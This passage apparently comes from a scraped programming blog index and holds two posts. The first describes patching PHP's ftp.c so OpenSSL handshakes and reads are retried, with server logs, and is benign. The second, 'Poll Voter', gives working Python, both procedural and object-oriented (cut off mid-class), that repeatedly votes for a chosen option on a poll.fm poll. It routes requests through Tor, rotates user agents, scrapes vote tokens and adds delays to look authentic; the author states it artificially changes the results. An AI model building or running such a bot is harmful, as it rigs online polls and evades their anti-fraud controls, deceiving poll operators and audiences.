the speed of your pc.</p> <p>At the end of the process I got a build complete message. Something that I wasn't sure about here, were all the warnings that were generated during the compile. Most of them were about type conversion and possible loss of data. I would think that these need to be fixed or maybe there is a compiler switch to turn them off. Since PHP worked anyway, I ignored them and continued... Update: 10/30/2007 - Apparently these warnings are ok. Dreaming of Dawn</p>","tags":["PHP","OpenSSL","C","Programming"]},{"location":"posts/PHPOpenSSL/#part-2-patching-php","title":"PART 2 - PATCHING PHP","text":"<p>After compiling PHP I was able to use the ftp_ssl_connect() function without getting that awful function undefined message. I set out to use my new function and custom built PHP, only to discover that there was yet another problem...</p> <p>It is important to note that all of the testing was done with Serv-U FTP Server. I don't know if this error would occur with other servers.</p> <p>Here is the piece of code I've been using for my initial testing. Keep in mind that this was code ran from the command line:</p> <pre><code>&lt;?php\n$ftp_server = 'server.onlan.local';\n$ftp_user_name  = 'username';\n$ftp_user_pass = 'password';\n\n// set up basic ssl connection\n$conn_id = ftp_ssl_connect($ftp_server, 2222, 5);\n\nif($conn_id)\n{\n    $login_result = ftp_login($conn_id, $ftp_user_name, $ftp_user_pass);\n    if($login_result){\n        echo 'ok\\n';\n        ftp_pasv($conn_id, true);\n        $buff = ftp_rawlist($conn_id, '.');\n        print_r($buff);\n    }else\n        echo 'error\\n';\n\n    ftp_close($conn_id);\n}\nelse\n{\n    echo 'no workie\\n';\n}\n?&gt;\n</code></pre> <p>When I ran this code with PHP after the initial compile it executed with the fallowing output:</p> <pre><code>PHP Warning:  ftp_login(): SSL/TLS handshake failed in C:\\Documents and Settings\\user\\Desktop\\php_with_ftp_ssl_connect\\ftpssltest.php on line 11\nPHP Warning:  ftp_login(): AUTH command OK. Initializing SSL connection. in C:\\Documents and Settings\\user\\Desktop\\php_with_ftp_ssl_connect\\ftpssltest.php on line 11\n</code></pre> <p>It connected to the server with ftp_ssl_connect(), but then failed when it was time to authenticate with ftp_login(). Below is a portion of the FTP server log with this session.</p> <pre><code>[6] Thu 11Oct07 08:14:29 - (000125) 234 AUTH command OK. Initializing SSL connection.\n[7] Thu 11Oct07 08:14:29 - Sock ID=595 setsockopt(260,IPPROTO_TCP,TCP_NODELAY,0x010AD03C,4) --&gt; 0 (OK)\n[7] Thu 11Oct07 08:14:29 - Sock ID=595 RB_READ Stat=OK\n[7] Thu 11Oct07 08:14:29 - Sock ID=595 RB_WRITE Stat=OK\n[7] Thu 11Oct07 08:14:29 - Sock ID=595 send(260,0x00A58118,51,0) --&gt; 51 (OK)\n[7] Thu 11Oct07 08:14:29 - Sock ID=595 RB_READ Stat=OK\n[7] Thu 11Oct07 08:14:29 - Sock ID=595 SSL_set_accept_state(0x012091B0)\n[7] Thu 11Oct07 08:14:29 - Sock ID=595 SSL_accept(0x012091B0) --&gt; -1 (SSL_ERROR_WANT_READ - (null))\n[7] Thu 11Oct07 08:14:30 - Sock ID=595 FD_READ Stat=OK\n[7] Thu 11Oct07 08:14:30 - Sock ID=595 SSL_accept(0x012091B0) --&gt; -1 (SSL_ERROR_WANT_READ - (null))\n[7] Thu 11Oct07 08:14:30 - Sock ID=595 FD_READ Stat=OK\n[7] Thu 11Oct07 08:14:30 - Sock ID=595 SSL_accept(0x012091B0) --&gt; -1 (SSL_ERROR_SSL - wrong version number)\n[7] Thu 11Oct07 08:14:30 - Sock ID=595 FD_READ Stat=OK\n[7] Thu 11Oct07 08:14:30 - Sock ID=595 SSL_set_accept_state(0x012091B0)\n[7] Thu 11Oct07 08:14:30 - Sock ID=595 SSL_accept(0x012091B0) --&gt; -1 (SSL_ERROR_SSL - internal error)\n[5] Thu 11Oct07 08:14:30 - Unable to establish SSL connection (internal error)\n[6] Thu 11Oct07 08:14:30 - (000125) 431 Unable to negotiate secure command connection.\n</code></pre> <p>As you can see it failed with SSL_ERROR_SSL - wrong version number. I still don't know what this means, but searching online ultimately lead me to the PHP bugs site. There I did a search for ftp_ssl_connect() and found two interesting bugs:  </p> <ol> <li>http://bugs.php.net/bug.php?id=36103  #36103</li> <li>http://bugs.php.net/bug.php?id=41021  #41021</li> </ol> <p>In bug #36103 there is a link to a patch by tony2001 that looked promising.</p> <p>I opened up <code>c:\\Work\\php5\\ext\\ftp\\ftp.c</code>. Right after the opening bracket of the ftp_login() function I replaced these lines of code:</p> <pre><code>#if HAVE_OPENSSL_EXT\n    SSL_CTX *ctx = NULL;\n#endif\n</code></pre> <p>with these lines:</p> <pre><code>#if HAVE_OPENSSL_EXT\n    int errcode;\n    SSL_CTX *ctx = NULL;\n#endif\n</code></pre> <p>Then, in the same function, I replaced these lines of code:</p> <pre><code>if (SSL_connect(ftp-&gt;ssl_handle) &lt;= 0) {\n    php_error_docref(NULL TSRMLS_CC, E_WARNING, 'SSL/TLS handshake failed');\n    SSL_shutdown(ftp-&gt;ssl_handle);\n    return 0;\n}\n</code></pre> <p>with these lines of code:</p> <pre><code>do {\n    errcode = SSL_connect(ftp-&gt;ssl_handle);\n    switch (SSL_get_error (ftp-&gt;ssl_handle, errcode)) {\n        case SSL_ERROR_NONE:\n            errcode = 1;\n            break;\n        case SSL_ERROR_WANT_WRITE:\n        case SSL_ERROR_WANT_READ:\n        case SSL_ERROR_WANT_X509_LOOKUP:\n            errcode = 0;\n            break;\n        default:\n            /* true error happened */\n            php_error_docref(NULL TSRMLS_CC, E_WARNING, 'SSL/TLS handshake failed');\n            SSL_shutdown(ftp-&gt;ssl_handle);\n            return 0;\n            break;\n    }\n} while(errcode == 0 &amp;&amp; !SSL_is_init_finished(ftp-&gt;ssl_handle));\n</code></pre> <p>I recompiled and executed the same code with the patched PHP and I was able to get a little further. Here is the FTP server log with this patch in effect: <pre><code>[6] Thu 11Oct07 09:22:54 - (000126) 234 AUTH command OK. Initializing SSL connection.\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 setsockopt(260,IPPROTO_TCP,TCP_NODELAY,0x010AD03C,4) --&gt; 0 (OK)\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 RB_READ Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 RB_WRITE Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 send(260,0x00A58118,51,0) --&gt; 51 (OK)\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 RB_READ Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_set_accept_state(0x012091B0)\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_accept(0x012091B0) --&gt; -1 (SSL_ERROR_WANT_READ - (null))\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 FD_READ Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_accept(0x012091B0) --&gt; -1 (SSL_ERROR_WANT_READ - (null))\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 FD_READ Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_accept(0x012091B0) --&gt; -1 (SSL_ERROR_WANT_READ - (null))\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 FD_READ Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_accept(0x012091B0) --&gt; 1 (OK - not reused, TLSv1/SSLv3, AES128-SHA (128 bits))\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 FD_READ Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_read(0x012091B0,0x00B28D14,2048) --&gt; 8 (OK)\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 RB_READ Stat=OK\n[2] Thu 11Oct07 09:22:54 - (000126) PBSZ 0\n[6] Thu 11Oct07 09:22:54 - (000126) 200 PBSZ command OK. Protection buffer size set to 0.\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 RB_READ Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_read(0x012091B0,0x00B28D14,2048) --&gt; -1 (SSL_ERROR_WANT_READ - (null))\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 RB_WRITE Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_write(0x012091B0,0x00A58118,55) --&gt; 55 (OK)\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 FD_READ Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_read(0x012091B0,0x00B28D14,2048) --&gt; 8 (OK)\n[2] Thu 11Oct07 09:22:54 - (000126) PROT P\n[6] Thu 11Oct07 09:22:54 - (000126) 200 PROT command OK. Using private data connection.\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 RB_READ Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_read(0x012091B0,0x00B28D14,2048) --&gt; -1 (SSL_ERROR_WANT_READ - (null))\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 RB_WRITE Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_write(0x012091B0,0x00A58118,53) --&gt; 53 (OK)\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 FD_READ Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_read(0x012091B0,0x00B28D14,2048) --&gt; 16 (OK)\n[2] Thu 11Oct07 09:22:54 - (000126) USER username\n[6] Thu 11Oct07 09:22:54 - (000126) 331 User name okay, need password.\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 RB_READ Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_read(0x012091B0,0x00B28D14,2048) --&gt; -1 (SSL_ERROR_WANT_READ - (null))\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 RB_WRITE Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_write(0x012091B0,0x00A58118,36) --&gt; 36 (OK)\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 FD_READ Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_read(0x012091B0,0x00B28D14,2048) --&gt; 19 (OK)\n[2] Thu 11Oct07 09:22:54 - (000126) PASS xxxxx\n[5] Thu 11Oct07 09:22:54 - (000126) User USERNAME logged in\n[6] Thu 11Oct07 09:22:54 - (000126) 230 User logged in, proceed.\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 RB_READ Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_read(0x012091B0,0x00B28D14,2048) --&gt; -1 (SSL_ERROR_WANT_READ - (null))\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 RB_WRITE Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_write(0x012091B0,0x00A58118,30) --&gt; 30 (OK)\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 FD_READ Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_read(0x012091B0,0x00B28D14,2048) --&gt; 6 (OK)\n[2] Thu 11Oct07 09:22:54 - (000126) PASV\n[6] Thu 11Oct07 09:22:54 - (000126) 227 Entering Passive Mode (192,168,0,3,120,183)\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 RB_READ Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_read(0x012091B0,0x00B28D14,2048) --&gt; -1 (SSL_ERROR_WANT_READ - (null))\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 RB_WRITE Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_write(0x012091B0,0x00A58118,49) --&gt; 49 (OK)\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 FD_READ Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_read(0x012091B0,0x00B28D14,2048) --&gt; 8 (OK)\n[2] Thu 11Oct07 09:22:54 - (000126) TYPE A\n[6] Thu 11Oct07 09:22:54 - (000126) 200 Type set to A.\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 RB_READ Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_read(0x012091B0,0x00B28D14,2048) --&gt; -1 (SSL_ERROR_WANT_READ - (null))\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 RB_WRITE Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_write(0x012091B0,0x00A58118,20) --&gt; 20 (OK)\n[7] Thu 11Oct07 09:22:54 - Sock ID=597 FD_WRITE Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 FD_READ Stat=OK\n[7] Thu 11Oct07 09:22:54 - Sock ID=596 SSL_read(0x012091B0,0x00B28D14,2048) --&gt; 8 (OK)\n[2] Thu 11Oct07 09:22:54 - (000126) LIST .\n[7] Thu 11Oct07 09:23:18 - Sock ID=597 getpeername(548,0x010AAB70,0x010AAB88) --&gt; 0 (OK)\n[7] Thu 11Oct07 09:23:18 - Sock ID=597 inet_ntoa() --&gt; 192.168.0.116\n[6] Thu 11Oct07 09:23:18 - (000126) 150 Opening ASCII mode data connection for /bin/ls.\n[7] Thu 11Oct07 09:23:18 - Sock ID=597 setsockopt(548,SOL_SOCKET,SO_OOBINLINE,0x010AB454,4) --&gt; 0 (OK)\n[7] Thu 11Oct07 09:23:18 - Sock ID=597 setsockopt(548,SOL_SOCKET,SO_KEEPALIVE,0x010AB444,4) --&gt; 0 (OK)\n[7] Thu 11Oct07 09:23:18 - Sock ID=597 setsockopt(548,IPPROTO_TCP,TCP_NODELAY,0x010AB434,4) --&gt; 0 (OK)\n[7] Thu 11Oct07 09:23:18 - Sock ID=597 setsockopt(548,SOL_SOCKET,SO_SNDBUF,0x010AB428,4) --&gt; 0 (OK)\n[7] Thu 11Oct07 09:23:18 - Sock ID=597 setsockopt(548,SOL_SOCKET,SO_RCVBUF,0x010AB418,4) --&gt; 0 (OK)\n[7] Thu 11Oct07 09:23:18 - Sock ID=597 setsockopt(548,IPPROTO_TCP,TCP_NODELAY,0x010AAB48,4) --&gt; 0 (OK)\n[7] Thu 11Oct07 09:23:18 - Sock ID=597 SSL_set_accept_state(0x0124FA70)\n[7] Thu 11Oct07 09:23:18 - Sock ID=597 SSL_accept(0x0124FA70) --&gt; 0 (SSL_ERROR_SYSCALL - (null))\n[7] Thu 11Oct07 09:23:18 - Sock ID=597 SSL_free(0x0124FA70)\n[7] Thu 11Oct07 09:23:18 - Sock ID=597 WSAAsyncSelect(548,65662,0,&lt;&gt;) --&gt; 0 (OK)\n[7] Thu 11Oct07 09:23:18 - Sock ID=597 setsockopt(548,SOL_SOCKET,SO_LINGER,0x010A8AF0,4) --&gt; 0 (OK)\n[7] Thu 11Oct07 09:23:18 - Sock ID=597 shutdown(548,0) --&gt; 0 (OK)\n[7] Thu 11Oct07 09:23:18 - Sock ID=597 shutdown(548,1) --&gt; 0 (OK)\n[7] Thu 11Oct07 09:23:18 - Sock ID=597 closesocket(548) --&gt; 0 (OK)\n[6] Thu 11Oct07 09:23:18 - (000126) 522 SSL/TLS lib refuses to initiate secure data connection.\n</code></pre></p> <p>As you can see, this time the SSL connection was initialized, the private data connection was opened, the user was successfully authenticated, Pasv mode was set, and the command LIST to get a directory listing was sent. Unfortunately, that is where the script failed.</p> <p>At this point I wasn't sure what to do, but I decided I'd give <code>ftp.c</code> another look just in case I had missed something. I started at the top of the file and worked my way down. At first it didn't occur to me, but then I realized that the ftp_login() function might not be the only place where this patch was needed. Sure enough, towards the bottom of the file, I found another function: data_accept(). This made perfect sense, since after the LIST command is sent to the ftp server the actual information is sent through the data channel which is handled by this function.</p> <p>In the data_accept() function I replaced this code:</p> <pre><code>#if HAVE_OPENSSL_EXT\n    SSL_CTX     *ctx;\n#endif\n</code></pre> <p>with this code:</p> <pre><code>#if HAVE_OPENSSL_EXT\n    int errcode;\n    SSL_CTX     *ctx;\n#endif\n</code></pre> <p>Then, in the same function, I replaced this code:</p> <pre><code>if (SSL_connect(data-&gt;ssl_handle) &lt;= 0) {\n    php_error_docref(NULL TSRMLS_CC, E_WARNING, 'data_accept: SSL/TLS handshake failed');\n    SSL_shutdown(data-&gt;ssl_handle);\n    return 0;\n}\n</code></pre> <p>with these lines of code: (Please note that it is slightly different than the previous patch.)</p> <pre><code>do {\n    errcode = SSL_connect(data-&gt;ssl_handle);\n    switch (SSL_get_error (data-&gt;ssl_handle, errcode)) {\n        case SSL_ERROR_NONE:\n            errcode = 1;\n            break;\n        case SSL_ERROR_WANT_WRITE:\n        case SSL_ERROR_WANT_READ:\n        case SSL_ERROR_WANT_X509_LOOKUP:\n            errcode = 0;\n            break;\n        default:\n            // true error happened\n            php_error_docref(NULL TSRMLS_CC, E_WARNING, 'data_accept: SSL/TLS handshake failed');\n            SSL_shutdown(data-&gt;ssl_handle);\n            return 0;\n            break;\n    }\n} while(errcode == 0 &amp;&amp; !SSL_is_init_finished(data-&gt;ssl_handle));\n</code></pre> <p>After this last patch, I once again recompiled the source and ran the script. This time everything worked as expected, but after some testing I found another issue.</p> <p>Every few directory listings that I pulled down, the connection to the server would be lost. After further investigation I discovered that the cause of this was long directory listings in PASV mode. Every time I pulled a directory listing with more than approximately 5 to 10 files or folders everything was fine, but as soon as the listing contained more than that the connection would unexpectedly close.</p> <p>Start Update: 10/30/2007 I again set out to find the problem. Since this only happened when the directory listing was long, I knew it had something to do with data not fitting inside a container. I started looking for areas in the code where this would be the case, and the first one that I found that made sense to me was this line of code: data = ecalloc(1, sizeof(data)); in the ftp_getdata() function located in the ftp.c file. data is of type databuf_t which is defined in the ftp.h file. I changed the size of this buffer to twice the size from 4096 to 8192. (I was surprised to find out that there was a comment in the code that stated this buffer size should be editable at runtime.) After I recompiled, the error was gone and everything seemed to work normally.</p> <p>After further testing I discovered that I didn't need to have the buffer be twice the size, but simply one byte bigger. From 4096 to 4097. (This is very odd, and I'm sure there is a way to fix this in the code, but I just don't know where)</p> <p>After some testing I discovered that the above is wrong. Changing the buffer caused my SSL communication to break, but because the server was set to handle both ssl or non-ssl connections I did not notice it. I changed the buffer back to the original size of 4096, and I was able to trace the problem to something else:</p> <p>In the my_recv() function at added these lines of code at the beginning of the function:</p> <pre><code>#if HAVE_OPENSSL_EXT\n    int no_error;\n#endif\n</code></pre> <p>and replaced this line of code:</p> <pre><code>nr_bytes = SSL_read(ftp-&gt;data-&gt;ssl_handle, buf, len);\n</code></pre> <p>with these lines:</p> <pre><code>no_error = 1; // there is no error\ndo{\n    nr_bytes = SSL_read(ftp-&gt;data-&gt;ssl_handle, buf, len);\n    switch (SSL_get_error (ftp-&gt;data-&gt;ssl_handle, nr_bytes)) {\n        case SSL_ERROR_NONE:\n        case SSL_ERROR_ZERO_RETURN:\n        case SSL_ERROR_WANT_WRITE:\n        case SSL_ERROR_WANT_X509_LOOKUP:\n        case SSL_ERROR_WANT_READ:\n            break;\n        case SSL_ERROR_WANT_CONNECT:\n        case SSL_ERROR_WANT_ACCEPT:\n        case SSL_ERROR_SSL:\n        case SSL_ERROR_SYSCALL:\n        default:\n            no_error = 0; //major error, get out\n            break;\n    }\n}while(nr_bytes &lt; 0 &amp;&amp; no_error);\n</code></pre> <p>After SSL_read() was executed I got -1 as the return. A call to SSL_get_error() returned SSL_ERROR_WANT_READ. From what I've been able to find online and the OpenSSL documentation, when this happens, you need to retry the SSL_read() function. After a few retries, the function succeeded and was able to get the data.</p> <p>(I've done some testing and this patch seems to be working reliably.) End Update: 10/30/2007</p> <p>I ran a session with Ghisler's Total Commander which uses the same OpenSSL libraries to make a secure FTP connection, and the server logs looked almost identical to the log generated when connecting with PHP.</p> <p>Here are the main concerns I have:</p>","tags":["PHP","OpenSSL","C","Programming"]},{"location":"posts/PHPOpenSSL/#php-compile","title":"PHP Compile","text":"<ol> <li> <p>What other configuration lines do I really need to get a production ready PHP like what you get from the main PHP downloads site with OpenSSL support included? Is --with-openssl enough?</p> </li> <li> <p>Why do I get all those warnings when compiling PHP? Update: 10/30/2007 - Apparently these warnings are ok. Dreaming of Dawn</p> </li> </ol>","tags":["PHP","OpenSSL","C","Programming"]},{"location":"posts/PHPOpenSSL/#php-patch","title":"PHP Patch","text":"<ol> <li> <p>Why hasn't Tony's patch made it into the official release? (Perhaps I can add mine as well...)</p> </li> <li> <p>Why are there several SSL_ERROR_WANT_READ errors? These show up in both the PHP and the Total Commander FTP logs. Update: 10/30/2007 - SSL_ERROR_WANT_READ is normal. It just means \"there is no data available yet.\"</p> </li> <li> <p>While changing the data buffer works, I wonder what other side effects it may have on functionality. Why is increasing it by one byte enough? Update: 10/30/2007 - Changing the data buffer breaks SSL communication.</p> </li> </ol>","tags":["PHP","OpenSSL","C","Programming"]},{"location":"posts/PollVote/","title":"Poll Voter","text":"<p>Published: 2020-11-15</p> <p>Poll Voter is a \"Bot\" that automatically votes for a certain, user specified option on an online poll artificially changing the results.</p> <p>The original code is below with the refactored version in OOP.</p>","tags":["Python","OOP","Programming"]},{"location":"posts/PollVote/#poll-vote-code","title":"Poll Vote Code","text":"<pre><code>#!/usr/bin/env python3\n\n# Load libraries\nimport logging\nimport random\nimport datetime\nimport os\nimport sys\nimport time\nimport json\nimport requests\n\nfrom torpy import TorClient\nfrom torpy.http.adapter import TorHttpAdapter\nfrom bs4 import BeautifulSoup as BeaSoup\n\n# Constants\nRETRIES = 3\nOWNP = os.path.abspath(os.path.dirname(sys.argv[0]))\nLOGFILE = '/media/sf_data/scriptsout/vote/vote.txt'\n\n# Setup Logging\nlogging.basicConfig(\n    format='%(asctime)s:%(levelname)s:%(message)s',\n    level=logging.INFO,\n    filename=LOGFILE)\n\n# Storage for the useragent strings from file\n#   facilitates picking at random\nuseragents = []\n\n# Make it look like a real browser\nheaders = {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml; \\\n        q=0.9,image/webp,*/*;q=0.8\",\n    \"Accept-Encoding\": \"gzip, deflate, br\",\n    \"Accept-Language\": \"en-US,en;q=0.5\",\n    \"DNT\": \"1\",\n    \"Host\": \"\", # set at runtime\n    \"Upgrade-Insecure-Requests\": \"1\",\n    \"User-Agent\": \"\", # set at runtime\n    \"Cache-Control\": \"max-age=0\",\n    \"Connection\": \"keep-alive\"\n}\n\npoll_id = \"10614272\" # change for a different poll\npoll_winner = \"49167224\" # which item to vote for | 49167240, 49167239, 49167224\n\n# Poll base url\nurl_poll = (\n    \"https://poll.fm/\"\n    + poll_id\n)\n\n# Generated URL to be submited for vote\nurl_template = (\n    \"https://poll.fm/vote?\"\n    \"va={item_va}\"\n    \"&amp;pt=0\"\n    \"&amp;r={item_r}\"\n    \"&amp;p=\" + poll_id +\n    \"&amp;a=\" + poll_winner + \",\"\n    \"&amp;o=\"  # nothing needed here\n    \"&amp;t={item_t}\"\n    \"&amp;token={item_token}\"\n    \"&amp;pz={item_pz}\"\n)\n\n# *****************************************************************************\n# Helper Functions\n# *****************************************************************************\n\n# Loads the user agents from file into the array\ndef get_useragents():\n    logging.info(\"Loading useragent strings\")\n    with open(OWNP + '/useragent.txt', 'r') as f:\n        for line in f:\n            useragents.append(line.rstrip('\\n').rstrip('\\r'))    \n\n# *****************************************************************************\n# Main Function\n# *****************************************************************************\n\ndef main():\n    getdata = True\n\n    try:\n        get_useragents() # Load user agents\n        headers[\"Host\"] = \"poll.fm\"\n\n        while getdata: # Loop until there is a problem\n            tor = TorClient() # Let's use Tor, shall we....\n\n            with tor.get_guard() as guard:\n                adapter = TorHttpAdapter(guard, 3, retries=RETRIES)\n\n                with requests.Session() as s:\n                    s.mount('http://', adapter)\n                    s.mount('https://', adapter)\n\n                    # Make it look like a different browser randomly\n                    #   by changing the user-agent with every request\n                    line_no = random.randint(0, len(useragents)-1)\n                    cur_useragent = useragents[line_no]\n                    headers[\"User-Agent\"] = cur_useragent\n                    logging.info(\"User-Agent set to: %s\" % cur_useragent)\n\n                    # Go to poll main page to get the needed items\n                    #   to submit for the vote\n                    logging.info(\"Getting: %s\" % url_poll)\n                    r = s.get(url_poll, headers=headers)\n                    logging.info(\n                            \"First response: %s\" \n                            % r.status_code \n                            + \" \" \n                            + r.url\n                        )\n                    r.raise_for_status()\n\n                    # Get the html from the web page\n                    bs_content = BeaSoup(r.content, \"lxml\")\n\n                    # Get the info from the Vote button json object\n                    button_data = bs_content.find('a', \n                        class_=\"vote-button css-vote-button pds-vote-button\")\n\n                    v_bdata = button_data.attrs.get('data-vote')\n\n                    # Load as json data\n                    bdata = json.loads(v_bdata)\n\n                    # Get hidden form value\n                    v_pz = bs_content.find(attrs={\"name\": \"pz\"})\n\n                    # Inject data into vote URL template\n                    url_vote = url_template  # reset url_vote\n                    url_vote = url_vote.replace(\"{item_t}\", str(bdata['t']))\n                    url_vote = url_vote.replace(\"{item_token}\", str(bdata['n']))\n                    url_vote = url_vote.replace(\"{item_pz}\", str(v_pz['value']))\n                    url_vote = url_vote.replace(\"{item_r}\", str(bdata['b']))\n                    url_vote = url_vote.replace(\"{item_va}\", str(bdata['at']))\n\n                    # Makes it look slightly more authentic, by waiting \n                    #  before actually submitting the vote after the\n                    #  initial request to the poll.\n                    logging.info(\"Waiting 2 seconds before submitting.\")\n                    time.sleep(2)\n\n                    # Let's vote!\n                    logging.info(\"Getting: %s\" % url_vote)\n                    r = s.get(url_vote, headers=headers)\n\n                    # Redirected response, log it\n                    if r.history:\n                        logging.info(\"Request redirected\")\n                        for resp in r.history:\n                            logging.info(\n                                \"Redirected response: %s\" \n                                % resp.status_code \n                                + \" \" \n                                + resp.url\n                            )\n\n                    logging.info(\n                            \"Final destination: %s\" \n                            % r.status_code \n                            + \" \" \n                            + r.url\n                        )\n\n                    r.raise_for_status()\n\n                    # Wait a random number of seconds between 5 &amp; 20\n                    #  before starting again - more realistic\n                    wait_time = random.randint(5, 20)\n                    logging.info(\"Waiting %i seconds.\" % (wait_time))\n                    time.sleep(wait_time)\n\n    # Any issues, log them and get out.\n    except Exception as e:\n        logging.error(e)\n\n        # Exit loop\n        getdata = False\n\n# *****************************************************************************\n# Script Starting Point\n# *****************************************************************************\nif __name__ == \"__main__\":\n    main()\n</code></pre>","tags":["Python","OOP","Programming"]},{"location":"posts/PollVote/#poll-vote-code-oop","title":"Poll Vote Code (OOP)","text":"","tags":["Python","OOP","Programming"]},{"location":"posts/PollVote/#main-votepy","title":"Main (vote.py)","text":"<ul> <li>Main entry point/start of program</li> </ul> <pre><code>#!/usr/bin/env python3\n\n# Load libraries\nimport logging\n\nfrom voting import PollFMVoter\n\nLOGFILE = '/media/sf_data/scriptsout/vote/vote.txt'\n\n# Setup Logging\nlogging.basicConfig(\n    format='%(asctime)s:%(levelname)s:%(message)s',\n    level=logging.INFO,\n    filename=LOGFILE)\n\n# *****************************************************************************\n# Main Function\n# *****************************************************************************\n\ndef main():\n    myvtr = PollFMVoter()\n    myvtr.poll_id = \"10614272\"\n    myvtr.poll_option = \"49167239\"\n    myvtr.getVotes()\n\n# *****************************************************************************\n# Script Starting Point\n# *****************************************************************************\nif __name__ == \"__main__\":\n    main()\n</code></pre>","tags":["Python","OOP","Programming"]},{"location":"posts/PollVote/#autovoter-voterpy","title":"AutoVoter (voter.py)","text":"<ul> <li>\"Generic\" Class to inherit from with common code.</li> </ul> <pre><code># Load libraries\nimport logging\nimport random\nimport os\nimport sys\n\nfrom abc import abstractmethod, abstractproperty\n\n# Constants\nOWNP = os.path.abspath(os.path.dirname(sys.argv[0]))\n\nlogger = logging.getLogger(__name__)\n\nclass AutoVoter:\n    def __init__(self):\n        self._useragents = []\n\n        self._url_poll = \"\"\n        self._url_template = \"\"\n\n        # Make it look like a real browser\n        self._headers = {\n            \"Accept\": \"text/html,application/xhtml+xml,application/xml; \\\n                q=0.9,image/webp,*/*;q=0.8\",\n            \"Accept-Encoding\": \"gzip, deflate, br\",\n            \"Accept-Language\": \"en-US,en;q=0.5\",\n            \"DNT\": \"1\",\n            \"Host\": \"\", # set at runtime\n            \"Upgrade-Insecure-Requests\": \"1\",\n            \"User-Agent\": \"\", # set at runtime\n            \"Cache-Control\": \"max-age=0\",\n            \"Connection\": \"keep-alive\"\n        }\n\n        self.__get_useragents()\n\n    # Loads a new, random user-agent string   \n    def _set_useragent(self):\n        line_no = random.randint(0, len(self._useragents)-1)\n        logger.info(\"User-agent set as: %s\" % self._useragents[line_no]) \n        self._headers[\"User-Agent\"] = self._useragents[line_no]\n\n    # Loads the user agents from file into the array\n    def __get_useragents(self):\n        logger.info(\"Loading useragent strings\")\n        with open(OWNP + '/voting/useragent.txt', 'r') as f:\n            for line in f:\n                self._useragents.append(line.rstrip('\\n').rstrip('\\r')) \n\n    @abstractmethod\n    def __getVote(self):\n        pass\n\n    @abstractmethod\n    def getVotes(self):\n        pass\n</code></pre>","tags":["Python","OOP","Programming"]},{"location":"posts/PollVote/#pollfmvoter-pollfmpy","title":"PollFMVoter (pollfm.py)","text":"<ul> <li>More specific class, inherits from AutoVoter and implements specifics.</li> </ul> <pre><code># Load libraries\nimport logging\nimport random\nimport time\nimport json\nimport requests\n\nfrom torpy import TorClient\nfrom torpy.http.adapter import TorHttpAdapter\nfrom bs4 import BeautifulSoup as BeaSoup\n\nfrom voting.voter import AutoVoter\n\nlogger = logging.getLogger(__name__)\n\nclass PollFMVoter(AutoVoter):\n    def __init__(self):\n        super().__init__()\n        self._headers[\"Host\"] = \"poll.fm\"\n\n        self.poll_id = \"\"\n        self.poll_option = \"\"\n        self.poll_votes = 0\n\n        self.__vote_pointer = 0\n        self.__retries = 3\n        self.__url_poll = \"https://poll.fm/{poll_id}\"\n\n        # Generated URL to be submited for vote\n        self.__url_template = (\n            \"https://poll.fm/vote?\"\n            \"va={item_va}\"\n            \"&amp;pt=0\"\n            \"&amp;r={item_r}\"\n            \"&amp;p={item_pid}\"\n            \"&amp;a={item_opt},\"\n            \"&amp;o=\"  # nothing needed here\n            \"&amp;t={item_t}\"\n            \"&amp;token={item_token}\"\n            \"&amp;pz={item_pz}\"\n        )\n\n    def 